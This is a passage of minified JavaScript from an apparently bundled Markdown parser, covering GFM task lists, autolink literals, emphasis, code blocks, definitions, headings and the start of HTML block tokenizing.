t=this.stack[this.stack.length-2];t.type,t.checked=e.type===`taskListCheckValueChecked`}function ar(e){let t=this.stack[this.stack.length-2];if(t&&t.type===`listItem`&&typeof t.checked==`boolean`){let e=this.stack[this.stack.length-1];e.type;let n=e.children[0];if(n&&n.type===`text`){let r=t.children,i=-1,a;for(;++i<r.length;){let e=r[i];if(e.type===`paragraph`){a=e;break}}a===e&&(n.value=n.value.slice(1),n.value.length===0?e.children.shift():e.position&&n.position&&typeof n.position.start.offset==`number`&&(n.position.start.column++,n.position.start.offset++,e.position.start=Object.assign({},n.position.start)))}}this.exit(e)}function or(e,t,n,r){let i=e.children[0],a=typeof e.checked==`boolean`&&i&&i.type===`paragraph`,o=`[`+(e.checked?`x`:` `)+`] `,s=n.createTracker(r);a&&s.move(o);let c=Bn.listItem(e,t,n,{...r,...s.current()});return a&&(c=c.replace(/^(?:[*+-]|\d+\.)([\r\n]| {1,3})/,l)),c;function l(e){return e+o}}function sr(){return[Qe(),St(),Dt(),qn(),nr()]}function cr(e){return{extensions:[$e(),Ct(e),Ot(),tr(e),rr()]}}function lr(e,t,n,r){let i=e.length,a=0,o;if(t=t<0?-t>i?0:i+t:t>i?i:t,n=n>0?n:0,r.length<1e4)o=Array.from(r),o.unshift(t,n),e.splice(...o);else for(n&&e.splice(t,n);a<r.length;)o=r.slice(a,a+1e4),o.unshift(t,0),e.splice(...o),a+=1e4,t+=1e4}function ur(e,t){return e.length>0?(lr(e,e.length,0,t),e):t}var dr={}.hasOwnProperty;function fr(e){let t={},n=-1;for(;++n<e.length;)pr(t,e[n]);return t}function pr(e,t){let n;for(n in t){let r=(dr.call(e,n)?e[n]:void 0)||(e[n]={}),i=t[n],a;if(i)for(a in i){dr.call(r,a)||(r[a]=[]);let e=i[a];mr(r[a],Array.isArray(e)?e:e?[e]:[])}}}function mr(e,t){let n=-1,r=[];for(;++n<t.length;)(t[n].add===`after`?e:r).push(t[n]);lr(e,0,0,r)}var hr={tokenize:kr,partial:!0},gr={tokenize:Ar,partial:!0},_r={tokenize:jr,partial:!0},vr={tokenize:Mr,partial:!0},yr={tokenize:Nr,partial:!0},br={name:`wwwAutolink`,tokenize:Dr,previous:Pr},xr={name:`protocolAutolink`,tokenize:Or,previous:Fr},Sr={name:`emailAutolink`,tokenize:Er,previous:Ir},Cr={};function wr(){return{text:Cr}}for(var Tr=48;Tr<123;)Cr[Tr]=Sr,Tr++,Tr===58?Tr=65:Tr===91&&(Tr=97);Cr[43]=Sr,Cr[45]=Sr,Cr[46]=Sr,Cr[95]=Sr,Cr[72]=[Sr,xr],Cr[104]=[Sr,xr],Cr[87]=[Sr,br],Cr[119]=[Sr,br];function Er(e,t,n){let r=this,i,a;return o;function o(t){return!Lr(t)||!Ir.call(r,r.previous)||Rr(r.events)?n(t):(e.enter(`literalAutolink`),e.enter(`literalAutolinkEmail`),s(t))}function s(t){return Lr(t)?(e.consume(t),s):t===64?(e.consume(t),c):n(t)}function c(t){return t===46?e.check(yr,u,l)(t):t===45||t===95||Te(t)?(a=!0,e.consume(t),c):u(t)}function l(t){return e.consume(t),i=!0,c}function u(o){return a&&i&&we(r.previous)?(e.exit(`literalAutolinkEmail`),e.exit(`literalAutolink`),t(o)):n(o)}}function Dr(e,t,n){let r=this;return i;function i(t){return t!==87&&t!==119||!Pr.call(r,r.previous)||Rr(r.events)?n(t):(e.enter(`literalAutolink`),e.enter(`literalAutolinkWww`),e.check(hr,e.attempt(gr,e.attempt(_r,a),n),n)(t))}function a(n){return e.exit(`literalAutolinkWww`),e.exit(`literalAutolink`),t(n)}}function Or(e,t,n){let r=this,i=``,a=!1;return o;function o(t){return(t===72||t===104)&&Fr.call(r,r.previous)&&!Rr(r.events)?(e.enter(`literalAutolink`),e.enter(`literalAutolinkHttp`),i+=String.fromCodePoint(t),e.consume(t),s):n(t)}function s(t){if(we(t)&&i.length<5)return i+=String.fromCodePoint(t),e.consume(t),s;if(t===58){let n=i.toLowerCase();if(n===`http`||n===`https`)return e.consume(t),c}return n(t)}function c(t){return t===47?(e.consume(t),a?l:(a=!0,c)):n(t)}function l(t){return t===null||De(t)||j(t)||Me(t)||je(t)?n(t):e.attempt(gr,e.attempt(_r,u),n)(t)}function u(n){return e.exit(`literalAutolinkHttp`),e.exit(`literalAutolink`),t(n)}}function kr(e,t,n){let r=0;return i;function i(t){return(t===87||t===119)&&r<3?(r++,e.consume(t),i):t===46&&r===3?(e.consume(t),a):n(t)}function a(e){return e===null?n(e):t(e)}}function Ar(e,t,n){let r,i,a;return o;function o(t){return t===46||t===95?e.check(vr,c,s)(t):t===null||j(t)||Me(t)||t!==45&&je(t)?c(t):(a=!0,e.consume(t),o)}function s(t){return t===95?r=!0:(i=r,r=void 0),e.consume(t),o}function c(e){return i||r||!a?n(e):t(e)}}function jr(e,t){let n=0,r=0;return i;function i(o){return o===40?(n++,e.consume(o),i):o===41&&r<n?a(o):o===33||o===34||o===38||o===39||o===41||o===42||o===44||o===46||o===58||o===59||o===60||o===63||o===93||o===95||o===126?e.check(vr,t,a)(o):o===null||j(o)||Me(o)?t(o):(e.consume(o),i)}function a(t){return t===41&&r++,e.consume(t),i}}function Mr(e,t,n){return r;function r(o){return o===33||o===34||o===39||o===41||o===42||o===44||o===46||o===58||o===59||o===63||o===95||o===126?(e.consume(o),r):o===38?(e.consume(o),a):o===93?(e.consume(o),i):o===60||o===null||j(o)||Me(o)?t(o):n(o)}function i(e){return e===null||e===40||e===91||j(e)||Me(e)?t(e):r(e)}function a(e){return we(e)?o(e):n(e)}function o(t){return t===59?(e.consume(t),r):we(t)?(e.consume(t),o):n(t)}}function Nr(e,t,n){return r;function r(t){return e.consume(t),i}function i(e){return Te(e)?n(e):t(e)}}function Pr(e){return e===null||e===40||e===42||e===95||e===91||e===93||e===126||j(e)}function Fr(e){return!we(e)}function Ir(e){return!(e===47||Lr(e))}function Lr(e){return e===43||e===45||e===46||e===95||Te(e)}function Rr(e){let t=e.length,n=!1;for(;t--;){let r=e[t][1];if((r.type===`labelLink`||r.type===`labelImage`)&&!r._balanced){n=!0;break}if(r._gfmAutolinkLiteralWalkedInto){n=!1;break}}return e.length>0&&!n&&(e[e.length-1][1]._gfmAutolinkLiteralWalkedInto=!0),n}function zr(e){let t=[],n=-1,r=0,i=0;for(;++n<e.length;){let a=e.charCodeAt(n),o=``;if(a===37&&Te(e.charCodeAt(n+1))&&Te(e.charCodeAt(n+2)))i=2;else if(a<128)/[!#$&-;=?-Z_a-z~]/.test(String.fromCharCode(a))||(o=String.fromCharCode(a));else if(a>55295&&a<57344){let t=e.charCodeAt(n+1);a<56320&&t>56319&&t<57344?(o=String.fromCharCode(a,t),i=1):o=`�`}else o=String.fromCharCode(a);o&&=(t.push(e.slice(r,n),encodeURIComponent(o)),r=n+i+1,``),i&&=(n+=i,0)}return t.join(``)+e.slice(r)}function Br(e,t,n){let r=[],i=-1;for(;++i<e.length;){let a=e[i].resolveAll;a&&!r.includes(a)&&(t=a(t,n),r.push(a))}return t}var Vr={name:`attention`,resolveAll:Hr,tokenize:Ur};function Hr(e,t){let n=-1,r,i,a,o,s,c,l,u;for(;++n<e.length;)if(e[n][0]===`enter`&&e[n][1].type===`attentionSequence`&&e[n][1]._close){for(r=n;r--;)if(e[r][0]===`exit`&&e[r][1].type===`attentionSequence`&&e[r][1]._open&&t.sliceSerialize(e[r][1]).charCodeAt(0)===t.sliceSerialize(e[n][1]).charCodeAt(0)){if((e[r][1]._close||e[n][1]._open)&&(e[n][1].end.offset-e[n][1].start.offset)%3&&!((e[r][1].end.offset-e[r][1].start.offset+e[n][1].end.offset-e[n][1].start.offset)%3))continue;c=e[r][1].end.offset-e[r][1].start.offset>1&&e[n][1].end.offset-e[n][1].start.offset>1?2:1;let d={...e[r][1].end},f={...e[n][1].start};Wr(d,-c),Wr(f,c),o={type:c>1?`strongSequence`:`emphasisSequence`,start:d,end:{...e[r][1].end}},s={type:c>1?`strongSequence`:`emphasisSequence`,start:{...e[n][1].start},end:f},a={type:c>1?`strongText`:`emphasisText`,start:{...e[r][1].end},end:{...e[n][1].start}},i={type:c>1?`strong`:`emphasis`,start:{...o.start},end:{...s.end}},e[r][1].end={...o.start},e[n][1].start={...s.end},l=[],e[r][1].end.offset-e[r][1].start.offset&&(l=ur(l,[[`enter`,e[r][1],t],[`exit`,e[r][1],t]])),l=ur(l,[[`enter`,i,t],[`enter`,o,t],[`exit`,o,t],[`enter`,a,t]]),l=ur(l,Br(t.parser.constructs.insideSpan.null,e.slice(r+1,n),t)),l=ur(l,[[`exit`,a,t],[`enter`,s,t],[`exit`,s,t],[`exit`,i,t]]),e[n][1].end.offset-e[n][1].start.offset?(u=2,l=ur(l,[[`enter`,e[n][1],t],[`exit`,e[n][1],t]])):u=0,lr(e,r-1,n-r+3,l),n=r+l.length-u-2;break}}for(n=-1;++n<e.length;)e[n][1].type===`attentionSequence`&&(e[n][1].type=`data`);return e}function Ur(e,t){let n=this.parser.constructs.attentionMarkers.null,r=this.previous,i=Qt(r),a;return o;function o(t){return a=t,e.enter(`attentionSequence`),s(t)}function s(o){if(o===a)return e.consume(o),s;let c=e.exit(`attentionSequence`),l=Qt(o),u=!l||l===2&&i||n.includes(o),d=!i||i===2&&l||n.includes(r);return c._open=!!(a===42?u:u&&(i||!d)),c._close=!!(a===42?d:d&&(l||!u)),t(o)}}function Wr(e,t){e.column+=t,e.offset+=t,e._bufferIndex+=t}var Gr={name:`autolink`,tokenize:Kr};function Kr(e,t,n){let r=0;return i;function i(t){return e.enter(`autolink`),e.enter(`autolinkMarker`),e.consume(t),e.exit(`autolinkMarker`),e.enter(`autolinkProtocol`),a}function a(t){return we(t)?(e.consume(t),o):t===64?n(t):l(t)}function o(e){return e===43||e===45||e===46||Te(e)?(r=1,s(e)):l(e)}function s(t){return t===58?(e.consume(t),r=0,c):(t===43||t===45||t===46||Te(t))&&r++<32?(e.consume(t),s):(r=0,l(t))}function c(r){return r===62?(e.exit(`autolinkProtocol`),e.enter(`autolinkMarker`),e.consume(r),e.exit(`autolinkMarker`),e.exit(`autolink`),t):r===null||r===32||r===60||De(r)?n(r):(e.consume(r),c)}function l(t){return t===64?(e.consume(t),u):Ee(t)?(e.consume(t),l):n(t)}function u(e){return Te(e)?d(e):n(e)}function d(n){return n===46?(e.consume(n),r=0,u):n===62?(e.exit(`autolinkProtocol`).type=`autolinkEmail`,e.enter(`autolinkMarker`),e.consume(n),e.exit(`autolinkMarker`),e.exit(`autolink`),t):f(n)}function f(t){if((t===45||Te(t))&&r++<63){let n=t===45?f:d;return e.consume(t),n}return n(t)}}function P(e,t,n,r){let i=r?r-1:1/0,a=0;return o;function o(r){return M(r)?(e.enter(n),s(r)):t(r)}function s(r){return M(r)&&a++<i?(e.consume(r),s):(e.exit(n),t(r))}}var qr={partial:!0,tokenize:Jr};function Jr(e,t,n){return r;function r(t){return M(t)?P(e,i,`linePrefix`)(t):i(t)}function i(e){return e===null||A(e)?t(e):n(e)}}var Yr={continuation:{tokenize:Zr},exit:Qr,name:`blockQuote`,tokenize:Xr};function Xr(e,t,n){let r=this;return i;function i(t){if(t===62){let n=r.containerState;return n.open||=(e.enter(`blockQuote`,{_container:!0}),!0),e.enter(`blockQuotePrefix`),e.enter(`blockQuoteMarker`),e.consume(t),e.exit(`blockQuoteMarker`),a}return n(t)}function a(n){return M(n)?(e.enter(`blockQuotePrefixWhitespace`),e.consume(n),e.exit(`blockQuotePrefixWhitespace`),e.exit(`blockQuotePrefix`),t):(e.exit(`blockQuotePrefix`),t(n))}}function Zr(e,t,n){let r=this;return i;function i(t){return M(t)?P(e,a,`linePrefix`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)(t):a(t)}function a(r){return e.attempt(Yr,t,n)(r)}}function Qr(e){e.exit(`blockQuote`)}var $r={name:`characterEscape`,tokenize:ei};function ei(e,t,n){return r;function r(t){return e.enter(`characterEscape`),e.enter(`escapeMarker`),e.consume(t),e.exit(`escapeMarker`),i}function i(r){return Ae(r)?(e.enter(`characterEscapeValue`),e.consume(r),e.exit(`characterEscapeValue`),e.exit(`characterEscape`),t):n(r)}}var ti={name:`characterReference`,tokenize:ni};function ni(e,t,n){let r=this,i=0,a,o;return s;function s(t){return e.enter(`characterReference`),e.enter(`characterReferenceMarker`),e.consume(t),e.exit(`characterReferenceMarker`),c}function c(t){return t===35?(e.enter(`characterReferenceMarkerNumeric`),e.consume(t),e.exit(`characterReferenceMarkerNumeric`),l):(e.enter(`characterReferenceValue`),a=31,o=Te,u(t))}function l(t){return t===88||t===120?(e.enter(`characterReferenceMarkerHexadecimal`),e.consume(t),e.exit(`characterReferenceMarkerHexadecimal`),e.enter(`characterReferenceValue`),a=6,o=ke,u):(e.enter(`characterReferenceValue`),a=7,o=Oe,u(t))}function u(s){if(s===59&&i){let i=e.exit(`characterReferenceValue`);return o===Te&&!Hn(r.sliceSerialize(i))?n(s):(e.enter(`characterReferenceMarker`),e.consume(s),e.exit(`characterReferenceMarker`),e.exit(`characterReference`),t)}return o(s)&&i++<a?(e.consume(s),u):n(s)}}var ri={partial:!0,tokenize:oi},ii={concrete:!0,name:`codeFenced`,tokenize:ai};function ai(e,t,n){let r=this,i={partial:!0,tokenize:x},a=0,o=0,s;return c;function c(e){return l(e)}function l(t){let n=r.events[r.events.length-1];return a=n&&n[1].type===`linePrefix`?n[2].sliceSerialize(n[1],!0).length:0,s=t,e.enter(`codeFenced`),e.enter(`codeFencedFence`),e.enter(`codeFencedFenceSequence`),u(t)}function u(t){return t===s?(o++,e.consume(t),u):o<3?n(t):(e.exit(`codeFencedFenceSequence`),M(t)?P(e,d,`whitespace`)(t):d(t))}function d(n){return n===null||A(n)?(e.exit(`codeFencedFence`),r.interrupt?t(n):e.check(ri,h,b)(n)):(e.enter(`codeFencedFenceInfo`),e.enter(`chunkString`,{contentType:`string`}),f(n))}function f(t){return t===null||A(t)?(e.exit(`chunkString`),e.exit(`codeFencedFenceInfo`),d(t)):M(t)?(e.exit(`chunkString`),e.exit(`codeFencedFenceInfo`),P(e,p,`whitespace`)(t)):t===96&&t===s?n(t):(e.consume(t),f)}function p(t){return t===null||A(t)?d(t):(e.enter(`codeFencedFenceMeta`),e.enter(`chunkString`,{contentType:`string`}),m(t))}function m(t){return t===null||A(t)?(e.exit(`chunkString`),e.exit(`codeFencedFenceMeta`),d(t)):t===96&&t===s?n(t):(e.consume(t),m)}function h(t){return e.attempt(i,b,g)(t)}function g(t){return e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),_}function _(t){return a>0&&M(t)?P(e,v,`linePrefix`,a+1)(t):v(t)}function v(t){return t===null||A(t)?e.check(ri,h,b)(t):(e.enter(`codeFlowValue`),y(t))}function y(t){return t===null||A(t)?(e.exit(`codeFlowValue`),v(t)):(e.consume(t),y)}function b(n){return e.exit(`codeFenced`),t(n)}function x(e,t,n){let i=0;return a;function a(t){return e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),c}function c(t){return e.enter(`codeFencedFence`),M(t)?P(e,l,`linePrefix`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)(t):l(t)}function l(t){return t===s?(e.enter(`codeFencedFenceSequence`),u(t)):n(t)}function u(t){return t===s?(i++,e.consume(t),u):i>=o?(e.exit(`codeFencedFenceSequence`),M(t)?P(e,d,`whitespace`)(t):d(t)):n(t)}function d(r){return r===null||A(r)?(e.exit(`codeFencedFence`),t(r)):n(r)}}}function oi(e,t,n){let r=this;return i;function i(t){return t===null?n(t):(e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),a)}function a(e){return r.parser.lazy[r.now().line]?n(e):t(e)}}var si={name:`codeIndented`,tokenize:li},ci={partial:!0,tokenize:ui};function li(e,t,n){let r=this;return i;function i(t){return e.enter(`codeIndented`),P(e,a,`linePrefix`,5)(t)}function a(e){let t=r.events[r.events.length-1];return t&&t[1].type===`linePrefix`&&t[2].sliceSerialize(t[1],!0).length>=4?o(e):n(e)}function o(t){return t===null?c(t):A(t)?e.attempt(ci,o,c)(t):(e.enter(`codeFlowValue`),s(t))}function s(t){return t===null||A(t)?(e.exit(`codeFlowValue`),o(t)):(e.consume(t),s)}function c(n){return e.exit(`codeIndented`),t(n)}}function ui(e,t,n){let r=this;return i;function i(t){return r.parser.lazy[r.now().line]?n(t):A(t)?(e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),i):P(e,a,`linePrefix`,5)(t)}function a(e){let a=r.events[r.events.length-1];return a&&a[1].type===`linePrefix`&&a[2].sliceSerialize(a[1],!0).length>=4?t(e):A(e)?i(e):n(e)}}var di={name:`codeText`,previous:pi,resolve:fi,tokenize:mi};function fi(e){let t=e.length-4,n=3,r,i;if((e[n][1].type===`lineEnding`||e[n][1].type===`space`)&&(e[t][1].type===`lineEnding`||e[t][1].type===`space`)){for(r=n;++r<t;)if(e[r][1].type===`codeTextData`){e[n][1].type=`codeTextPadding`,e[t][1].type=`codeTextPadding`,n+=2,t-=2;break}}for(r=n-1,t++;++r<=t;)i===void 0?r!==t&&e[r][1].type!==`lineEnding`&&(i=r):(r===t||e[r][1].type===`lineEnding`)&&(e[i][1].type=`codeTextData`,r!==i+2&&(e[i][1].end=e[r-1][1].end,e.splice(i+2,r-i-2),t-=r-i-2,r=i+2),i=void 0);return e}function pi(e){return e!==96||this.events[this.events.length-1][1].type===`characterEscape`}function mi(e,t,n){let r=0,i,a;return o;function o(t){return e.enter(`codeText`),e.enter(`codeTextSequence`),s(t)}function s(t){return t===96?(e.consume(t),r++,s):(e.exit(`codeTextSequence`),c(t))}function c(t){return t===null?n(t):t===32?(e.enter(`space`),e.consume(t),e.exit(`space`),c):t===96?(a=e.enter(`codeTextSequence`),i=0,u(t)):A(t)?(e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),c):(e.enter(`codeTextData`),l(t))}function l(t){return t===null||t===32||t===96||A(t)?(e.exit(`codeTextData`),c(t)):(e.consume(t),l)}function u(n){return n===96?(e.consume(n),i++,u):i===r?(e.exit(`codeTextSequence`),e.exit(`codeText`),t(n)):(a.type=`codeTextData`,l(n))}}var hi=class{constructor(e){this.left=e?[...e]:[],this.right=[]}get(e){if(e<0||e>=this.left.length+this.right.length)throw RangeError("Cannot access index `"+e+"` in a splice buffer of size `"+(this.left.length+this.right.length)+"`");return e<this.left.length?this.left[e]:this.right[this.right.length-e+this.left.length-1]}get length(){return this.left.length+this.right.length}shift(){return this.setCursor(0),this.right.pop()}slice(e,t){let n=t??1/0;return n<this.left.length?this.left.slice(e,n):e>this.left.length?this.right.slice(this.right.length-n+this.left.length,this.right.length-e+this.left.length).reverse():this.left.slice(e).concat(this.right.slice(this.right.length-n+this.left.length).reverse())}splice(e,t,n){let r=t||0;this.setCursor(Math.trunc(e));let i=this.right.splice(this.right.length-r,1/0);return n&&gi(this.left,n),i.reverse()}pop(){return this.setCursor(1/0),this.left.pop()}push(e){this.setCursor(1/0),this.left.push(e)}pushMany(e){this.setCursor(1/0),gi(this.left,e)}unshift(e){this.setCursor(0),this.right.push(e)}unshiftMany(e){this.setCursor(0),gi(this.right,e.reverse())}setCursor(e){if(!(e===this.left.length||e>this.left.length&&this.right.length===0||e<0&&this.left.length===0)){if(e<this.left.length){let t=this.left.splice(e,1/0);gi(this.right,t.reverse())}else{let t=this.right.splice(this.left.length+this.right.length-e,1/0);gi(this.left,t.reverse())}}}};function gi(e,t){let n=0;if(t.length<1e4)e.push(...t);else for(;n<t.length;)e.push(...t.slice(n,n+1e4)),n+=1e4}function _i(e){let t={},n=-1,r,i,a,o,s,c,l,u=new hi(e);for(;++n<u.length;){for(;n in t;)n=t[n];if(r=u.get(n),n&&r[1].type===`chunkFlow`&&u.get(n-1)[1].type===`listItemPrefix`&&(c=r[1]._tokenizer.events,a=0,a<c.length&&c[a][1].type===`lineEndingBlank`&&(a+=2),a<c.length&&c[a][1].type===`content`))for(;++a<c.length&&c[a][1].type!==`content`;)c[a][1].type===`chunkText`&&(c[a][1]._isInFirstContentOfListItem=!0,a++);if(r[0]===`enter`)r[1].contentType&&(Object.assign(t,vi(u,n)),n=t[n],l=!0);else if(r[1]._container){for(a=n,i=void 0;a--;)if(o=u.get(a),o[1].type===`lineEnding`||o[1].type===`lineEndingBlank`)o[0]===`enter`&&(i&&(u.get(i)[1].type=`lineEndingBlank`),o[1].type=`lineEnding`,i=a);else if(o[1].type!==`linePrefix`&&o[1].type!==`listItemIndent`)break;i&&(r[1].end={...u.get(i)[1].start},s=u.slice(i,n),s.unshift(r),u.splice(i,n-i+1,s))}}return lr(e,0,1/0,u.slice(0)),!l}function vi(e,t){let n=e.get(t)[1],r=e.get(t)[2],i=t-1,a=[],o=n._tokenizer;o||(o=r.parser[n.contentType](n.start),n._contentTypeTextTrailing&&(o._contentTypeTextTrailing=!0));let s=o.events,c=[],l={},u,d,f=-1,p=n,m=0,h=0,g=[h];for(;p;){for(;e.get(++i)[1]!==p;);a.push(i),p._tokenizer||(u=r.sliceStream(p),p.next||u.push(null),d&&o.defineSkip(p.start),p._isInFirstContentOfListItem&&(o._gfmTasklistFirstContentOfListItem=!0),o.write(u),p._isInFirstContentOfListItem&&(o._gfmTasklistFirstContentOfListItem=void 0)),d=p,p=p.next}for(p=n;++f<s.length;)s[f][0]===`exit`&&s[f-1][0]===`enter`&&s[f][1].type===s[f-1][1].type&&s[f][1].start.line!==s[f][1].end.line&&(h=f+1,g.push(h),p._tokenizer=void 0,p.previous=void 0,p=p.next);for(o.events=[],p?(p._tokenizer=void 0,p.previous=void 0):g.pop(),f=g.length;f--;){let t=s.slice(g[f],g[f+1]),n=a.pop();c.push([n,n+t.length-1]),e.splice(n,2,t)}for(c.reverse(),f=-1;++f<c.length;)l[m+c[f][0]]=m+c[f][1],m+=c[f][1]-c[f][0]-1;return l}var yi={resolve:xi,tokenize:Si},bi={partial:!0,tokenize:Ci};function xi(e){return _i(e),e}function Si(e,t){let n;return r;function r(t){return e.enter(`content`),n=e.enter(`chunkContent`,{contentType:`content`}),i(t)}function i(t){return t===null?a(t):A(t)?e.check(bi,o,a)(t):(e.consume(t),i)}function a(n){return e.exit(`chunkContent`),e.exit(`content`),t(n)}function o(t){return e.consume(t),e.exit(`chunkContent`),n.next=e.enter(`chunkContent`,{contentType:`content`,previous:n}),n=n.next,i}}function Ci(e,t,n){let r=this;return i;function i(t){return e.exit(`chunkContent`),e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),P(e,a,`linePrefix`)}function a(i){if(i===null||A(i))return n(i);let a=r.events[r.events.length-1];return!r.parser.constructs.disable.null.includes(`codeIndented`)&&a&&a[1].type===`linePrefix`&&a[2].sliceSerialize(a[1],!0).length>=4?t(i):e.interrupt(r.parser.constructs.flow,n,t)(i)}}function wi(e,t,n,r,i,a,o,s,c){let l=c||1/0,u=0;return d;function d(t){return t===60?(e.enter(r),e.enter(i),e.enter(a),e.consume(t),e.exit(a),f):t===null||t===32||t===41||De(t)?n(t):(e.enter(r),e.enter(o),e.enter(s),e.enter(`chunkString`,{contentType:`string`}),h(t))}function f(n){return n===62?(e.enter(a),e.consume(n),e.exit(a),e.exit(i),e.exit(r),t):(e.enter(s),e.enter(`chunkString`,{contentType:`string`}),p(n))}function p(t){return t===62?(e.exit(`chunkString`),e.exit(s),f(t)):t===null||t===60||A(t)?n(t):(e.consume(t),t===92?m:p)}function m(t){return t===60||t===62||t===92?(e.consume(t),p):p(t)}function h(i){return!u&&(i===null||i===41||j(i))?(e.exit(`chunkString`),e.exit(s),e.exit(o),e.exit(r),t(i)):u<l&&i===40?(e.consume(i),u++,h):i===41?(e.consume(i),u--,h):i===null||i===32||i===40||De(i)?n(i):(e.consume(i),i===92?g:h)}function g(t){return t===40||t===41||t===92?(e.consume(t),h):h(t)}}function Ti(e,t,n,r,i,a){let o=this,s=0,c;return l;function l(t){return e.enter(r),e.enter(i),e.consume(t),e.exit(i),e.enter(a),u}function u(l){return s>999||l===null||l===91||l===93&&!c||l===94&&!s&&`_hiddenFootnoteSupport`in o.parser.constructs?n(l):l===93?(e.exit(a),e.enter(i),e.consume(l),e.exit(i),e.exit(r),t):A(l)?(e.enter(`lineEnding`),e.consume(l),e.exit(`lineEnding`),u):(e.enter(`chunkString`,{contentType:`string`}),d(l))}function d(t){return t===null||t===91||t===93||A(t)||s++>999?(e.exit(`chunkString`),u(t)):(e.consume(t),c||=!M(t),t===92?f:d)}function f(t){return t===91||t===92||t===93?(e.consume(t),s++,d):d(t)}}function Ei(e,t,n,r,i,a){let o;return s;function s(t){return t===34||t===39||t===40?(e.enter(r),e.enter(i),e.consume(t),e.exit(i),o=t===40?41:t,c):n(t)}function c(n){return n===o?(e.enter(i),e.consume(n),e.exit(i),e.exit(r),t):(e.enter(a),l(n))}function l(t){return t===o?(e.exit(a),c(o)):t===null?n(t):A(t)?(e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),P(e,l,`linePrefix`)):(e.enter(`chunkString`,{contentType:`string`}),u(t))}function u(t){return t===o||t===null||A(t)?(e.exit(`chunkString`),l(t)):(e.consume(t),t===92?d:u)}function d(t){return t===o||t===92?(e.consume(t),u):u(t)}}function Di(e,t){let n;return r;function r(i){return A(i)?(e.enter(`lineEnding`),e.consume(i),e.exit(`lineEnding`),n=!0,r):M(i)?P(e,r,n?`linePrefix`:`lineSuffix`)(i):t(i)}}var Oi={name:`definition`,tokenize:Ai},ki={partial:!0,tokenize:ji};function Ai(e,t,n){let r=this,i;return a;function a(t){return e.enter(`definition`),o(t)}function o(t){return Ti.call(r,e,s,n,`definitionLabel`,`definitionLabelMarker`,`definitionLabelString`)(t)}function s(t){return i=N(r.sliceSerialize(r.events[r.events.length-1][1]).slice(1,-1)),t===58?(e.enter(`definitionMarker`),e.consume(t),e.exit(`definitionMarker`),c):n(t)}function c(t){return j(t)?Di(e,l)(t):l(t)}function l(t){return wi(e,u,n,`definitionDestination`,`definitionDestinationLiteral`,`definitionDestinationLiteralMarker`,`definitionDestinationRaw`,`definitionDestinationString`)(t)}function u(t){return e.attempt(ki,d,d)(t)}function d(t){return M(t)?P(e,f,`whitespace`)(t):f(t)}function f(a){return a===null||A(a)?(e.exit(`definition`),r.parser.defined.push(i),t(a)):n(a)}}function ji(e,t,n){return r;function r(t){return j(t)?Di(e,i)(t):n(t)}function i(t){return Ei(e,a,n,`definitionTitle`,`definitionTitleMarker`,`definitionTitleString`)(t)}function a(t){return M(t)?P(e,o,`whitespace`)(t):o(t)}function o(e){return e===null||A(e)?t(e):n(e)}}var Mi={name:`hardBreakEscape`,tokenize:Ni};function Ni(e,t,n){return r;function r(t){return e.enter(`hardBreakEscape`),e.consume(t),i}function i(r){return A(r)?(e.exit(`hardBreakEscape`),t(r)):n(r)}}var Pi={name:`headingAtx`,resolve:Fi,tokenize:Ii};function Fi(e,t){let n=e.length-2,r=3,i,a;return e[r][1].type===`whitespace`&&(r+=2),n-2>r&&e[n][1].type===`whitespace`&&(n-=2),e[n][1].type===`atxHeadingSequence`&&(r===n-1||n-4>r&&e[n-2][1].type===`whitespace`)&&(n-=r+1===n?2:4),n>r&&(i={type:`atxHeadingText`,start:e[r][1].start,end:e[n][1].end},a={type:`chunkText`,start:e[r][1].start,end:e[n][1].end,contentType:`text`},lr(e,r,n-r+1,[[`enter`,i,t],[`enter`,a,t],[`exit`,a,t],[`exit`,i,t]])),e}function Ii(e,t,n){let r=0;return i;function i(t){return e.enter(`atxHeading`),a(t)}function a(t){return e.enter(`atxHeadingSequence`),o(t)}function o(t){return t===35&&r++<6?(e.consume(t),o):t===null||j(t)?(e.exit(`atxHeadingSequence`),s(t)):n(t)}function s(n){return n===35?(e.enter(`atxHeadingSequence`),c(n)):n===null||A(n)?(e.exit(`atxHeading`),t(n)):M(n)?P(e,s,`whitespace`)(n):(e.enter(`atxHeadingText`),l(n))}function c(t){return t===35?(e.consume(t),c):(e.exit(`atxHeadingSequence`),s(t))}function l(t){return t===null||t===35||j(t)?(e.exit(`atxHeadingText`),s(t)):(e.consume(t),l)}}var Li=`address.article.aside.base.basefont.blockquote.body.caption.center.col.colgroup.dd.details.dialog.dir.div.dl.dt.fieldset.figcaption.figure.footer.form.frame.frameset.h1.h2.h3.h4.h5.h6.head.header.hr.html.iframe.legend.li.link.main.menu.menuitem.nav.noframes.ol.optgroup.option.p.param.search.section.summary.table.tbody.td.tfoot.th.thead.title.tr.track.ul`.split(`.`),Ri=[`pre`,`script`,`style`,`textarea`],F={concrete:!0,name:`htmlFlow`,resolveTo:Vi,tokenize:Hi},zi={partial:!0,tokenize:Wi},Bi={partial:!0,tokenize:Ui};function Vi(e){let t=e.length;for(;t--&&(e[t][0]!==`enter`||e[t][1].type!==`htmlFlow`););return t>1&&e[t-2][1].type===`linePrefix`&&(e[t][1].start=e[t-2][1].start,e[t+1][1].start=e[t-2][1].start,e.splice(t-2,2)),e}function Hi(e,t,n){let r=this,i,a,o,s,c;return l;function l(e){return u(e)}function u(t){return e.enter(`htmlFlow`),e.enter(`htmlFlowData`),e.consume(t),d}function d(s){return s===33?(e.consume(s),f):s===47?(e.consume(s),a=!0,h):s===63?(e.consume(s),i=3,r.interrupt?t:D):we(s)?(e.consume(s),o=String.fromCharCode(s),g):n(s)}function f(a){return a===45?(e.consume(a),i=2,p):a===91?(e.consume(a),i=5,s=0,m):we(a)?(e.consume(a),i=4,r.interrupt?t:D):n(a)}function p(i){return i===45?(e.consume(i),r.interrupt?t:D):n(i)}function m(i){return i===`CDATA[`.charCodeAt(s++)?(e.consume(i),s===6?r.interrupt?t:E:m):n(i)}function h(t){return we(t)?(e.consume(t),o=String.fromCharCode(t),g):n(t)}function g(s){if(s===null||s===47||s===62||j(s)){let 